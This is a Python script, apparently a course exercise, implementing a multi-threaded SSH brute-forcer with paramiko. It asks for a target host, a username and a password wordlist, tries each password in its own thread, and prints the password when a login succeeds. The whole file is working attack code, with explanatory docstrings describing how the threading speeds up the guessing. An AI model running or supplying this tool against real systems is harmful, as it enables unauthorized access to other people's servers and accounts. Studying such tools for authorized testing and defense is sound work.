import paramiko, sys, os, socket, termcolor
import threading, time

flag = 0

def ssh_connect(host, username, password):
    global flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # invoke the ssh.connect function and pass 4 parameters
        ssh.connect(host, port=22, username=username, password=password)
        print("\033[1;36;48m SSH Connection Established to " + host + '\a')
        # set flag to 1
        flag = 1
        # print 'found password' and print the password
        print('\033[1;32;48m Found Password: ' + password + '\a')
        pass
    except:
        # print 'incorrect login'
        print('\033[1;31;48m Incorrect login\a')
    ssh.close()


def main():
    # Prompt the user to enter target, username, and the password file
    #      We borrowed our input exactly from the first part
    """
    The input code is taken directly from part 1 with some identifying differences
    Instead of blue, the text is now yellow and there is a title message 
    Otherwise, there is no difference.
    """
    print("\033[2;25;48m Welcome to the Multi-Threaded ssh brute forcer")
    target = input('\033[1;33;48m Please enter the target username or IP: \a')
    verified_target = socket.gethostbyname(target)
    uname = input('\033[1;33;48m Please enter the user you would like to connect with: \a')
    filepath = input('\033[1;33;48m Please input the path to the password wordlist: \a')
    # check if the file exists
    # if not, exit
    #     Once again, this code is borrowed from the first section as it is logistically the same
    """
    This segment takes the boolean return value of the exists() function
    If the path exists, it returns true, so the main function passes.
    Otherwise, a big red error message is displayed and the program exits
    """
    if os.path.exists(filepath) == True:
        pass
    else:
        print('\033[1;31;48m File does not exist. Exiting..')
        sys.exit()
    
    """
    This section starts the actual threading process.
    First, the file is opened and each password is stripped, then the threading
    code is called.
    For each line it reads, a new thread is created which allows the process to run much faster.
    One negative this can produce is a lot of unneeded output, such as wrong password messages.
    This is not much of a negative as it can be easily remediated, but it is worth noting.
    The ssh_connect function is passed as the target process and the arguments were assigned
    If the flag of 1 indicating a successful connection is detected, the threads are joined 
    and the process exits. 
    """
    with open(filepath, 'r') as file:
        for line in file.readlines():
            password = line.strip()
            t = threading.Thread(target=ssh_connect, args=(target, uname, password))
            t.start()
            time.sleep(0.5)
            if flag == 1:
               t.join()
               exit()

if __name__ == '__main__':
    main()